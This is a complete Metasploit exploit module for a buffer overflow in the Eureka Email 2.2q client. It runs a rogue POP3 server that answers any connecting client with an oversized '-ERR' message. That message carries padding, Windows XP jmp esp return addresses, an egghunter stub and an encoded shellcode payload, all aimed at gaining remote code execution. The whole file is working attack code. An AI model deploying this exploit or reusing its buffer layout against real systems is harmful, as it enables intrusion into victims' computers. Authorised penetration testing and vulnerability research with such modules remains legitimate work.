class Metasploit3 < Msf::Exploit::Remote
        Rank = NormalRanking

        include Msf::Exploit::Remote::TcpServer
        include Msf::Exploit::Egghunter

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Eureka Email 2.2q ERR Remote Buffer Overflow Exploit',
                        'Description'    => %q{
                                This module exploits a buffer overflow in the Eureka Email 2.2q
                                client that is triggered through an excessively long ERR message.
                        },
                        'Author'         => [ 'Francis Provencher', 'Dr_IDE', 'dookie', ],
                        'License'        => MSF_LICENSE,
                        'Version'        => '$Revision: 7724 $',
                        'References'     =>
                                [
                                        [ 'URL', 'http://www.exploit-db.com/exploits/10235' ],
                                ],
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'seh',
                                },
                        'Payload'        =>
                                {
                                        'Space'    => 2000,
                                        'BadChars' => "\x00\x0a\x0d\x20",
                                        'StackAdjustment' => -3500,
                                },
                        'Platform'       => 'win',
                        'Targets'        =>
                                [
                                        [ 'Win XP SP2 English', { 'Ret' => 0x77D8AF0A } ], # jmp esp user32.dll
                                        [ 'Win XP SP3 English', { 'Ret' => 0x7E429353 } ], # jmp esp user32.dll
                                ],
                        'Privileged'     => false,
                        'DefaultTarget'  => 0))

                register_options(
                        [
                                OptPort.new('SRVPORT', [ true, "The POP3 daemon port to listen on", 110 ]),
                        ], self.class)
        end

        def on_client_connect(client)
                return if ((p = regenerate_payload(client)) == nil)

                # Unleash the Egghunter!
                eh_stub, eh_egg = generate_egghunter

                buffer =  "-ERR "
                buffer << rand_text_alpha_upper(710)
                buffer << [target.ret].pack('V')
                buffer << make_nops(10)
                buffer << eh_stub
                buffer << make_nops(200)
                buffer << rand_text_alpha_upper(2000)
                buffer << eh_egg * 2
                buffer << payload.encoded
                client.put(buffer)
        end

end
